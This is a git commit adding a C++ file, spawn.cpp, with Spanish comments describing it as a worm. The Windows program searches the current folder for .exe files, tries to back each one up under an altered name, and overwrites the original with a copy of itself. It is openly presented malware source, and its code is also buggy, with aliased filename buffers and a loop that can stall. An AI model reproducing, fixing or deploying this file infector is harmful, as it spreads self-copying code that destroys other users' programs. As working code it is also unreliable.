b6f808c32fc952997a119a1615d0c202ce7712bf
mila125 <81193843+mila125@users.noreply.github.com>
2021-07-26 19:32:04 -0400

    Add files via upload

---
+++ spawn.cpp
@@ -0,0 +1,92 @@
+#include <iostream>
+#include <Windows.h>
+
+using namespace std;
+int main()
+{
+    ///+++++++++++++++++++++++++++++++++++++++
+    ///        como se comportara worm
+
+  /// busco los archivos para sobreescribirlos
+
+  /// el worm  reemplaza el archivo   .exe
+
+   ///se crea un archivo que va a tener  el mismo contenido que el
+   
+   /// archivo que va agarar el worm pero con extencion ext
+   
+   ///busco el nuevo archivo
+
+   ///+++++++++++++++++++++++++++++++++++++++
+   ///             variables
+   ///estructura que contiene los datos del
+   ///exe  como la fecha de creacion , nombre y el tama�o en bytes de este
+   ///handler para realizar la busqueada de archivos
+   ///string para guardar el nombre
+   ///String para guardar el nombre nuevo para el exe infectado
+   ///string que contiene el nombre del gusano
+int num = 0 ;
+HANDLE handle;
+//LPCSTR formato=L;
+WIN32_FIND_DATAA lpFindFileData;
+char*  nombre_archivo_original;
+char* nombre_nuevo_archivo;
+TCHAR nombre_este_archivo[MAX_PATH];
+///+++++++++++++++++++++++++++++
+///           Accion
+GetModuleFileName(NULL,nombre_este_archivo,MAX_PATH);
+char *last_revslash = strrchr(nombre_este_archivo,92);
+int i =last_revslash-nombre_este_archivo+1;
+int j =0;
+
+cout<<i<<endl;
+
+char nombre_este_archivo_ss[MAX_PATH-i];
+
+char aux ;
+
+while(!(nombre_este_archivo[i]==0))
+{
+aux = nombre_este_archivo[i];
+nombre_este_archivo_ss[j]=aux ;
+
+	j++;
+	i++;
+}
+cout<<nombre_este_archivo_ss<<endl;
+
+handle=FindFirstFile("*.exe",&lpFindFileData);
+bool next_exists = true;
+while(next_exists==true)
+{
+  
+ 
+nombre_archivo_original=lpFindFileData.cFileName;
+
+
+
+if(!(strcmp(nombre_archivo_original,nombre_este_archivo_ss)==0))
+{
+	nombre_nuevo_archivo=nombre_archivo_original;
+	nombre_nuevo_archivo[j]='d';
+	cout<<nombre_nuevo_archivo<<endl;
+cout<<nombre_archivo_original<<endl;	
+CopyFile(nombre_archivo_original,nombre_nuevo_archivo,0);
+	BOOL b = CopyFile(nombre_este_archivo_ss,nombre_archivo_original,0);
+if (!b) {
+   cout << "Error: " << GetLastError() << endl;
+} else {
+  cout << "Okay " << endl;
+	
+}
+
+next_exists =  FindNextFile(handle,&lpFindFileData);
+}
+
+
+}
+
+
+
+return (0);
+}
